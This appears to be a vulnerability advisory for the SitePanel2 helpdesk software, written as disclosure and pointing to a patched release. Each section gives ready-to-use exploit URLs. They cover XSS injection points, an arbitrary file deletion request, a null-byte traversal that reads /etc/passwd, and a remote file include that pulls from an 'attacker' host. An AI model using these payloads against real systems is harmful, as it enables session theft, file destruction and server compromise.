Description:
SitePanel2 is a helpdesk / trouble ticket / support system used
by businesses and individuals alike. There are a number of
vulnerabilities in SitePanel2, some of which are fairly serious.
If an attacker is able to successfully exploit these vulnerabilities
in SitePanel2 he may be able to successfully compromise user accounts
or completely compromise the target web server. A security patch has
been released to address these issues and all users are strongly
encouraged to upgrade their SitePanel2 installations as soon as
possible.



Cross Site Scripting:
Cross site scripting exists in SitePanel2. This vulnerability exists
due to user supplied input not being checked properly.

http://host/users/main.php?p=5&do=2&v=177%22%3E[XSS]
http://host/admin/5.php?do=chsev&postid=177&usernamess=test&inadmin=no%22%3E[XSS]
http://host/admin/5.php?do=chsev2&postid=177&usernamess=test&inadmin=no&newsev=4%22%3E[XSS]
http://host/admin/5.php?do=chsev&postid=177%22%3E[XSS]&usernamess=test&inadmin=no
http://host/users/main.php?p=5&do=0&show=closed%22%3E[XSS]
http://host/admin/0.php?do=ratekb&id=11%22%3E[XSS]
http://host/users/main.php?p=6&do=0&v=post&id=11&sec_name=Blah%22%3E[XSS]

This vulnerability could be used to steal cookie based authentication
credentials within the scope of the current domain, or render hostile
code in a victim's browser.



Arbitrary File Deletion:
I found an arbitrary file deletion issue, which depending on server
permissions may allow an attacker to delete any file on the server.

http://host/admin/5.php?do=rmattach&rm=yes&id=../index.php

Even if the server is running as nobody you can still delete any and
all attachments you know the name of.



Directory Traversal Vulnerability:
Also, there is a local file include vulnerability. An attacker may specify
directory traversal sequences when calling the "lang" parameter and include
arbitrary files residing on the local machine.

http://host/users/index.php?lang=en.inc/../../../../../../etc/passwd%00

This issue can be used to read arbitrary files, or include and execute
arbitrary local files.



Arbitrary File Upload:
Nothing very technical here, but an attacker can upload malicious files
such as php scripts when attaching them to a trouble ticket and execute
them with the privileges of the target web server.



Remote File Include Vulnerability:
SitePanel2 is prone to both remote and local file include vulnerabilities
which may allow for an attacker to execute arbitrary commands on the victim
webserver by including malicious files.

http://host/users/main.php?p=http://attacker

Above is an example of how this issue could be exploited. The problem lies
in the way the "p" parameter is called. It is clearly not sanitized and can
be used to include arbitrary files from a remote location.



Solution:
The developer was contacted some months ago and a new version can be found
here http://forum.sitepanel2.com/index.php?showtopic=271
